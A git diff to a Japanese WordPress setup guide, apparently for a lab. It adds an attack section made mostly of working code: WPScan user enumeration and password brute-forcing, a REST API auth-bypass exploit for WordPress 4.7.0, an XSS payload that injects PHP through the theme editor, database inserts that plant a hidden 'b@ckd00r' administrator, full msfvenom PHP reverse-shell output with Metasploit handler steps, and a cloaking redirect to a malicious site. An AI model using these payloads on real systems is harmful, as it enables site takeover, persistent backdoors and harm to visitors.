@@ -126,22 +126,40 @@ Hello world!にアクセスできることを確認します。
 ![](/images/wordpress/wpindex.png)
 
 ### (option)wp_posts
-WordPressのコンテンツデータはデータベースに格納されています。
-mysqlにアクセスすることで投稿内容を確認できます。
+WordPressのコンテンツはデータベースに格納されています。
+mysqlにアクセスすることで投稿内容やユーザーデータを確認できます。
 ```
 # wpdbデータベースにテーブルが増えている事を確認
 echo "show tables;" | mysql -u wpadmin -D wpdb -pwpadmin
 
-# postsテーブル（投稿に関する情報）を確認
+# 投稿に関する情報を確認
 echo "select * from wp_46posts;" | mysql -u wpadmin -D wpdb -pwpadmin
+
+# ユーザー一覧を確認
+echo "select * from wp_users;" | mysql -u wpadmin -D wpdb -pwpadmin
+
+# ユーザー権限を確認
+echo "select * from wp_usermeta where meta_key Like 'wp_capabilities';" | mysql -u wpadmin -D wpdb -pwpadmin
 ```
-# REST API Vulnerability
+
+# 攻撃
+
+## WPScan
+```
+wpscan -u http://target-server/wordpress-dir/ --enum users
+wpscan -u http://target-server/wordpress-dir/ --username targetuser --wordlist passwordlist
+```
+
+[wordlist](https://www.openwall.com/wordlists/)
+
+## REST API Vulnerability
 WordPress4.7.0からREST APIが実装されました。
 APIを介してコンテンツの取得、更新、削除が行えます。
 REST APIが有効ならば以下のURLでコンテンツの一覧を取得できます。
 ```
 http://localhost/4.7.0/index.php/wp-json/wp/v2/posts/
 ```
+
 WordPress4.7.0のREST APIには認証バイパスの脆弱性があります。
 例えば以下のコードはWordPress4.7.0のHello World!ページを書き換えます。
 ```
@@ -153,3 +171,94 @@ payload = urllib.urlencode(payload)
 request = urllib2.Request(url, payload)
 urllib2.urlopen(request)
 ```
+
+## Activity Log Plugin Vulnerability
+https://www.securify.nl/en/advisory/SFY20160734/persistent-cross-site-scripting-in-wordpress-activity-log-plugin.html
+
+## XSS
+```
+#i=document.createElement('iframe');
+document.body.appendChild(i);
+i.src='http://localhost/4.7.0/wp-admin/theme-editor.php?file=functions.php';
+window.setTimeout(
+  function(){
+    nc=i.contentDocument.querySelector('#newcontent');
+    nc.value='<?php echo "HACK THE PLANET";phpinfo();exit()?>'+nc.value;
+    nc.form.submit.click()
+    }, 3000)
+```
+
+[XSS in WordPress: a tutorial](https://www.dxw.com/2017/07/wordpress-xss-tutorial/)
+
+- payload 1: 管理ユーザー作成
+
+```
+$wpdb->insert(
+  'wp_users',
+  array(
+    'ID' => 999,
+    'user_login' => 'b@ckd00r',
+    'user_pass' => md5('b@ckd00r')
+    ),
+  array(
+    '%d',
+    '%s',
+    '%s'
+    )
+  );
+
+$wpdb->insert(
+	'wp_usermeta',
+	array(
+		'umeta_id' => 99999,
+		'user_id' => 999,
+    'meta_key' => 'wp_capabilities',
+    'meta_value' => 'a:1:{s:13:"administrator";b:1;}'
+	),
+	array(
+    '%d',
+    '%d',
+    '%s',
+    '%s'
+	)
+);
+```
+
+- payload 2: リバースシェル設置
+
+```
+msfvenom -p php/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -f raw
+
+↓ 出力結果
+
+/*<?php /**/ error_reporting(0); $ip = '1.1.1.1'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
+```
+
+  - リバースシェルの利用
+
+    1. C2サーバを起動する
+    ```
+    msfconsole
+    msf > use exploit/multi/handler
+    msf exploit(handler) > set payload php/meterpreter/reverse_tcp
+    msf exploit(handler) > set LHOST c2_server_ip
+    msf exploit(handler) > set LPORT c2_server_port
+    msf exploit(handler) > exploit
+    ```
+    2. リバースシェルにアクセスする
+    ```
+    curl http://target-server/wordpress-dir/cracked.php
+    ```
+
+- payload 3: 条件分岐させる
+```
+<?php
+$refere = $_SERVER['HTTP_REFERER'];
+$ua = $_SERVER['HTTP_USER_AGENT'];
+if ( preg_match('/yahoo|google|bing/ui', $refere) and preg_match('/Chrome/ui', $ua)) {
+  die('<meta http-equiv="refresh" content="1;URL=http://malicious">');
+}
+?>
+```
+
+[commixproject](https://github.com/commixproject/commix/wiki/Upload-shells)
